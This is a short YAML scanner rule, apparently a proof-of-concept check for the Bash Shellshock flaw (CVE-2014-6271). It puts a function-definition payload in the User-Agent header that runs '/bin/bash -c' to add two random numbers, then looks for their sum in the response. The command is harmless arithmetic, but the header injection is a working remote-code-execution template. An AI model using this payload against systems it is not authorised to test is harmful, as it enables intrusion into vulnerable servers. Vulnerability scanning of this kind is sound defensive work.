detail:
  author: neal1991(https://github.com/neal1991)
  links:
  - https://github.com/opsxcq/exploit-CVE-2014-6271
expression: r0()
manual: true
name: poc-yaml-bash-cve-2014-6271
rules:
  r0:
    expression: response.body.bcontains(bytes(string(r1 + r2)))
    request:
      cache: true
      follow_redirects: false
      headers:
        User-Agent: () { :; }; echo; echo; /bin/bash -c 'expr {{r1}} + {{r2}}'
      method: GET
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
transport: http
